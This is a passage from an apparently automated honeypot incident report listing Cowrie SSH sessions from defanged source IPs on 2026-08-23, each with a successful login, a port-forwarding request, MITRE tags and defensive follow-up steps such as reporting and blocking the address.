| `2026-08-23 04:02:03` | `cowrie.client.version` |
| `2026-08-23 04:02:03` | `cowrie.client.kex` |
| `2026-08-23 04:02:04` | `cowrie.login.success` |
| `2026-08-23 04:02:04` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.255[.]56` to AbuseIPDB if not already reported
- [ ] Block `85.105.255[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05197659893b

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]53` |
| **First Seen** | 2026-08-23 04:02 |
| **Last Seen** | 2026-08-23 04:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:02:14` | `cowrie.session.connect` |
| `2026-08-23 04:02:15` | `cowrie.client.version` |
| `2026-08-23 04:02:15` | `cowrie.client.kex` |
| `2026-08-23 04:02:16` | `cowrie.login.success` |
| `2026-08-23 04:02:16` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]53` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7ef89864f70

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:03 |
| **Last Seen** | 2026-08-23 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:03:36` | `cowrie.session.connect` |
| `2026-08-23 04:03:36` | `cowrie.client.version` |
| `2026-08-23 04:03:36` | `cowrie.client.kex` |
| `2026-08-23 04:03:37` | `cowrie.login.success` |
| `2026-08-23 04:03:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:03:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:03:37` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eadec6464d61

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:03 |
| **Last Seen** | 2026-08-23 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:03:40` | `cowrie.session.connect` |
| `2026-08-23 04:03:40` | `cowrie.client.version` |
| `2026-08-23 04:03:41` | `cowrie.client.kex` |
| `2026-08-23 04:03:41` | `cowrie.login.success` |
| `2026-08-23 04:03:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:03:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:03:42` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96fea850bc46

| Field | Detail |
|---|---|
| **Source IP** | `126.13.48[.]207` |
| **First Seen** | 2026-08-23 04:06 |
| **Last Seen** | 2026-08-23 04:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:06:59` | `cowrie.session.connect` |
| `2026-08-23 04:07:00` | `cowrie.client.version` |
| `2026-08-23 04:07:00` | `cowrie.client.kex` |
| `2026-08-23 04:07:02` | `cowrie.login.success` |
| `2026-08-23 04:07:02` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `126.13.48[.]207` to AbuseIPDB if not already reported
- [ ] Block `126.13.48[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a0e53ad1b34

| Field | Detail |
|---|---|
| **Source IP** | `111.70.17[.]73` |
| **First Seen** | 2026-08-23 04:07 |
| **Last Seen** | 2026-08-23 04:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:07:08` | `cowrie.session.connect` |
| `2026-08-23 04:07:08` | `cowrie.client.version` |
| `2026-08-23 04:07:08` | `cowrie.client.kex` |
| `2026-08-23 04:07:10` | `cowrie.login.success` |
| `2026-08-23 04:07:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.17[.]73` to AbuseIPDB if not already reported
- [ ] Block `111.70.17[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cc736c8f8f7

| Field | Detail |
|---|---|
| **Source IP** | `63.65.203[.]83` |
| **First Seen** | 2026-08-23 04:07 |
| **Last Seen** | 2026-08-23 04:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:07:11` | `cowrie.session.connect` |
| `2026-08-23 04:07:12` | `cowrie.client.version` |
| `2026-08-23 04:07:12` | `cowrie.client.kex` |
| `2026-08-23 04:07:13` | `cowrie.login.success` |
| `2026-08-23 04:07:14` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.65.203[.]83` to AbuseIPDB if not already reported
- [ ] Block `63.65.203[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c9c6144384

| Field | Detail |
|---|---|
| **Source IP** | `58.242.215[.]40` |
| **First Seen** | 2026-08-23 04:07 |
| **Last Seen** | 2026-08-23 04:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:07:19` | `cowrie.session.connect` |
| `2026-08-23 04:07:19` | `cowrie.client.version` |
| `2026-08-23 04:07:19` | `cowrie.client.kex` |
| `2026-08-23 04:07:23` | `cowrie.login.success` |
| `2026-08-23 04:07:23` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:07:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.242.215[.]40` to AbuseIPDB if not already reported
- [ ] Block `58.242.215[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcfad5c9ac08

| Field | Detail |
|---|---|
| **Source IP** | `190.60.37[.]146` |
| **First Seen** | 2026-08-23 04:10 |
| **Last Seen** | 2026-08-23 04:10 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:10:43` | `cowrie.session.connect` |
| `2026-08-23 04:10:44` | `cowrie.client.version` |
| `2026-08-23 04:10:45` | `cowrie.client.kex` |
| `2026-08-23 04:10:51` | `cowrie.login.success` |
| `2026-08-23 04:10:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.60.37[.]146` to AbuseIPDB if not already reported
- [ ] Block `190.60.37[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-164a091341d7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:13 |
| **Last Seen** | 2026-08-23 04:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:13:12` | `cowrie.session.connect` |
| `2026-08-23 04:13:12` | `cowrie.client.version` |
| `2026-08-23 04:13:13` | `cowrie.client.kex` |
| `2026-08-23 04:13:13` | `cowrie.login.success` |
| `2026-08-23 04:13:14` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:13:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:13:14` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f05abceb5b2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:13 |
| **Last Seen** | 2026-08-23 04:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:13:17` | `cowrie.session.connect` |
| `2026-08-23 04:13:17` | `cowrie.client.version` |
| `2026-08-23 04:13:18` | `cowrie.client.kex` |
| `2026-08-23 04:13:19` | `cowrie.login.success` |
| `2026-08-23 04:13:19` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:13:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:13:19` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a2139942505

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:22 |
| **Last Seen** | 2026-08-23 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:22:42` | `cowrie.session.connect` |
| `2026-08-23 04:22:42` | `cowrie.client.version` |
| `2026-08-23 04:22:42` | `cowrie.client.kex` |
| `2026-08-23 04:22:43` | `cowrie.login.success` |
| `2026-08-23 04:22:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:22:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:22:44` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a93cd9f4824

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:22 |
| **Last Seen** | 2026-08-23 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:22:46` | `cowrie.session.connect` |
| `2026-08-23 04:22:46` | `cowrie.client.version` |
| `2026-08-23 04:22:46` | `cowrie.client.kex` |
| `2026-08-23 04:22:47` | `cowrie.login.success` |
| `2026-08-23 04:22:48` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:22:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:22:48` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26c3a9bd2ce

| Field | Detail |
|---|---|
| **Source IP** | `82.102.188[.]117` |
| **First Seen** | 2026-08-23 04:25 |
| **Last Seen** | 2026-08-23 04:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:25:52` | `cowrie.session.connect` |
| `2026-08-23 04:25:52` | `cowrie.client.version` |
| `2026-08-23 04:25:52` | `cowrie.client.kex` |
| `2026-08-23 04:25:53` | `cowrie.login.success` |
| `2026-08-23 04:25:54` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.102.188[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.102.188[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc4dea7f87d

| Field | Detail |
|---|---|
| **Source IP** | `189.51.96[.]70` |
| **First Seen** | 2026-08-23 04:25 |
| **Last Seen** | 2026-08-23 04:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:25:59` | `cowrie.session.connect` |
| `2026-08-23 04:25:59` | `cowrie.client.version` |
| `2026-08-23 04:25:59` | `cowrie.client.kex` |
| `2026-08-23 04:26:01` | `cowrie.login.success` |
| `2026-08-23 04:26:02` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.51.96[.]70` to AbuseIPDB if not already reported
- [ ] Block `189.51.96[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b498c9d0375b

| Field | Detail |
|---|---|
| **Source IP** | `200.199.32[.]174` |
| **First Seen** | 2026-08-23 04:29 |
| **Last Seen** | 2026-08-23 04:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:29:24` | `cowrie.session.connect` |
| `2026-08-23 04:29:24` | `cowrie.client.version` |
| `2026-08-23 04:29:24` | `cowrie.client.kex` |
| `2026-08-23 04:29:26` | `cowrie.login.success` |
| `2026-08-23 04:29:27` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.199.32[.]174` to AbuseIPDB if not already reported
- [ ] Block `200.199.32[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-238556deef25

| Field | Detail |
|---|---|
| **Source IP** | `121.179.93[.]147` |
| **First Seen** | 2026-08-23 04:29 |
| **Last Seen** | 2026-08-23 04:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:29:32` | `cowrie.session.connect` |
| `2026-08-23 04:29:33` | `cowrie.client.version` |
| `2026-08-23 04:29:33` | `cowrie.client.kex` |
| `2026-08-23 04:29:36` | `cowrie.login.success` |
| `2026-08-23 04:29:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.179.93[.]147` to AbuseIPDB if not already reported
- [ ] Block `121.179.93[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-656d347f3d04

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:32 |
| **Last Seen** | 2026-08-23 04:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:32:18` | `cowrie.session.connect` |
| `2026-08-23 04:32:18` | `cowrie.client.version` |
| `2026-08-23 04:32:18` | `cowrie.client.kex` |
| `2026-08-23 04:32:19` | `cowrie.login.success` |
| `2026-08-23 04:32:19` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:32:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:32:19` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:32:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22230833ce7b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:32 |
| **Last Seen** | 2026-08-23 04:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:32:22` | `cowrie.session.connect` |
| `2026-08-23 04:32:22` | `cowrie.client.version` |
| `2026-08-23 04:32:22` | `cowrie.client.kex` |
| `2026-08-23 04:32:23` | `cowrie.login.success` |
| `2026-08-23 04:32:23` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:32:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:32:23` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad4edada01b3

| Field | Detail |
|---|---|
| **Source IP** | `61.93.135[.]225` |
| **First Seen** | 2026-08-23 04:34 |
| **Last Seen** | 2026-08-23 04:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:34:27` | `cowrie.session.connect` |
| `2026-08-23 04:34:28` | `cowrie.client.version` |
| `2026-08-23 04:34:28` | `cowrie.client.kex` |
| `2026-08-23 04:34:30` | `cowrie.login.success` |
| `2026-08-23 04:34:31` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.93.135[.]225` to AbuseIPDB if not already reported
- [ ] Block `61.93.135[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac2ab3bb928f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 04:38 |
| **Last Seen** | 2026-08-23 04:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:38:13` | `cowrie.session.connect` |
| `2026-08-23 04:38:13` | `cowrie.client.version` |
| `2026-08-23 04:38:13` | `cowrie.client.kex` |
| `2026-08-23 04:38:14` | `cowrie.login.success` |
| `2026-08-23 04:38:14` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:38:14` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efc29d5e3cb9

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-08-23 04:39 |
| **Last Seen** | 2026-08-23 04:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:39:35` | `cowrie.session.connect` |
| `2026-08-23 04:39:35` | `cowrie.client.version` |
| `2026-08-23 04:39:35` | `cowrie.client.kex` |
| `2026-08-23 04:39:36` | `cowrie.login.success` |
| `2026-08-23 04:39:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:39:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-034038dbec92

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:41 |
| **Last Seen** | 2026-08-23 04:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:41:43` | `cowrie.session.connect` |
| `2026-08-23 04:41:43` | `cowrie.client.version` |
| `2026-08-23 04:41:43` | `cowrie.client.kex` |
| `2026-08-23 04:41:44` | `cowrie.login.success` |
| `2026-08-23 04:41:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:41:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:41:44` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d88306b3301e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:41 |
| **Last Seen** | 2026-08-23 04:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:41:47` | `cowrie.session.connect` |
| `2026-08-23 04:41:47` | `cowrie.client.version` |
| `2026-08-23 04:41:47` | `cowrie.client.kex` |
| `2026-08-23 04:41:48` | `cowrie.login.success` |
| `2026-08-23 04:41:48` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:41:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:41:48` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:41:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ff8cdb38a49

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:51 |
| **Last Seen** | 2026-08-23 04:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:51:15` | `cowrie.session.connect` |
| `2026-08-23 04:51:15` | `cowrie.client.version` |
| `2026-08-23 04:51:15` | `cowrie.client.kex` |
| `2026-08-23 04:51:16` | `cowrie.login.success` |
| `2026-08-23 04:51:16` | `cowrie.direct-tcpip.request` |
